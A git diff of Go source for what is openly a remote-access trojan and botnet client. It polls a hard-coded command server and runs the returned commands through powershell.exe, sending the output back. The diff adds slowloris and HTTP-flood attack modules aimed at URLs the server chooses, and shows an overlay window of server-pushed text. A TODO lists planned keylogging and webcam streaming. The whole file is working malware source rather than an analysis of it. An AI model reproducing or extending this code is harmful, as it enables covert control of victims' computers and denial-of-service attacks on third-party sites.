@@ -8,21 +8,23 @@ TODO:
 	2 -Play Audio file sent by server
 	3 - Access Webcam and stream to server
 	4 - keylogger and send data to server
+	5 - https://github.com/redcode-labs/Neurax
 */
 
 import (
 	"context"
-	_ "embed"
-	"fmt"
 	"log"
 	"os/exec"
 	"runtime"
 	"strings"
 	"syscall"
+	"time"
 	"unicode"
 	"unicode/utf8"
 	"unsafe"
 
+	"github.com/Xart3mis/AKILT/Client/lib/DOS/httpflood"
+	"github.com/Xart3mis/AKILT/Client/lib/DOS/slowloris"
 	"github.com/Xart3mis/AKILT/Client/lib/bundles"
 	"github.com/Xart3mis/AKILT/Client/lib/consumer"
 	"github.com/Xart3mis/AKILT/Client/lib/reg"
@@ -54,7 +56,7 @@ func init() {
 }
 
 func main() {
-	c, err := consumer.Init("172.21.105.205:8000")
+	c, err := consumer.Init("172.21.96.70:8000")
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -139,33 +141,50 @@ func main() {
 	syscall.SyscallN(SetWindowLongPtrW, uintptr(unsafe.Pointer(hwnd)), uintptr(GWL_EXSTYLE), uintptr(WS_EX_TOOLWINDOW|WS_EX_TRANSPARENT|WS_EX_LAYERED))
 	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(syscall.SW_SHOW))
 
-	window.SetOpacity(0.8)
+	window.SetOpacity(0.9)
 	window.SetCloseCallback(CloseCallback)
 
 	for !window.ShouldClose() {
 		text, should_update, err := GetOnScreenText(receiver, pid)
-		fmt.Println(text, should_update)
 		if err != nil {
 			log.Println(err)
 		}
 		Draw(font, mode, pid, text, window, should_update)
 
 		d, err := c.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
-		if err != nil {
-			log.Println("Error during GetCommand:", err)
-		}
-
-		var out []byte
-		if d.GetShouldExec() {
-			out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
-			c.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+		go func() {
 			if err != nil {
-				log.Println("Error during exec", err)
+				log.Println("Error during GetCommand:", err)
 			}
-		}
+
+			var out []byte
+			if d.GetShouldExec() {
+				out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
+				c.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+				if err != nil {
+					log.Println("Error during exec", err)
+				}
+			}
+		}()
+
+		flood, _ := c.GetFlood(ctx, &pb.Void{})
+		go func() {
+			if flood.GetShouldFlood() {
+				switch flood.FloodType {
+				case 0:
+					slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Microsecond,
+						time.Duration(flood.GetLimit())*time.Second)
+				case 1:
+					httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
+						flood.GetNumThreads())
+				}
+			}
+		}()
 	}
-	cancel()
+
 	receiver.CloseSend()
+	window.Destroy()
+	cancel()
 }
 
 func GetOnScreenText(receiver pb.Consumer_SubscribeOnScreenTextClient, pid string) (string, bool, error) {
@@ -215,7 +234,7 @@ func Draw(font *glfont.Font, mode *glfw.VidMode, pid string, text string, window
 	gl.ClearColor(0, 0, 0, 0)
 
 	if update {
-		font.SetColor(0, 0, 0, 1.0)
+		font.SetColor(0.10, 0.10, 0.02, 1.0)
 		for idx, line := range strings.Split(WordWrap(text, 40), "\n") {
 			font.Printf(float32(mode.Width)/2-font.Width(1.0, line)/2, float32(mode.Height)/3+float32(idx*55), 1.0, line)
 		}
